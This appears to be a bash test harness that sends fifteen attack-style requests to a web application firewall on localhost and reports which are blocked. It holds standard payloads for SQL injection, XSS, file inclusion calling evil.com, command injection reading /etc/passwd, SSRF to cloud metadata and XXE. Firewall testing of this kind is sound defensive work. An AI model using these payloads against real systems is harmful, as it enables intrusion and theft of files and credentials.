#!/bin/bash
U="User-Agent: WAF-Killer-Attacker"
T="http://127.0.0.1:8080"
echo "| ATTACK VECTOR | STATUS | RESULT |"
echo "|---|---|---|"

# 1
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?q=%27%20OR%201=1%20--")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 1. SQLi | $S | $R |"

# 2
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 2. XSS | $S | $R |"

# 3
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?file=..%2F..%2Fetc%2Fpasswd")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 3. LFI | $S | $R |"

# 4
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?file=http%3A%2F%2Fevil.com%2Fshell")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 4. RFI | $S | $R |"

# 5
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?cmd=%3Bcat%20%2Fetc%2Fpasswd")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 5. RCE | $S | $R |"

# 6
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" --path-as-is "$T/../../etc/passwd")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 6. Path Traversal | $S | $R |"

# 7
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?url=http%3A%2F%2F169.254.169.254%2Flatest%2F")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 7. SSRF | $S | $R |"

# 8 XXE
XML='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
S=$(echo "$XML" | curl -s -o /dev/null -w "%{http_code}" --max-time 2 -X POST -H 'Content-Type: application/xml' -H "$U" -d @- "$T/")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 8. XXE | $S | $R |"

# 9 CSRF
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -X POST -H "$U" -H "Cookie: session=admin" -d "amount=100" "$T/transfer")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 9. CSRF | $S | $R |"

# 10 Smuggling
# Simulated via headers
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -X POST -H "$U" -H "Transfer-Encoding: chunked" -H "Content-Length: 5" -d "0" "$T/")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 10. Request Smuggling | $S | $R |"

# 11 Protocol
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" -H "Host: " "$T/")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 11. Protocol Violation | $S | $R |"

# 12 DoS
PAYLOAD=$(printf 'A%.0s' {1..5000})
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/?a=$PAYLOAD")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 12. App Layer DoS | $S | $R |"

# 13 Stuffing
JSON='{"u":"admin","p":"123456"}'
S=$(echo "$JSON" | curl -s -o /dev/null -w "%{http_code}" --max-time 2 -X POST -H "$U" -H "Content-Type: application/json" -d @- "$T/login")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 13. Cred Stuffing | $S | $R |"

# 14 IDOR
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "$U" "$T/user/1001")
if [ "$S" = "403" ]; then R="✅ BLOCKED"; else R="❌ ALLOWED"; fi
echo "| 14. IDOR | $S | $R |"

# 15 Bot
S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "User-Agent: curl/7.64.1" "$T/")
# If bot detection is disabled, it should be 200. I think it is disabled now.
if [ "$S" = "403" ] || [ "$S" = "429" ]; then R="✅ BLOCKED/CHALLENGE"; else R="⚠️ ALLOWED (Bot Detection OFF)"; fi
echo "| 15. Bot | $S | $R |"
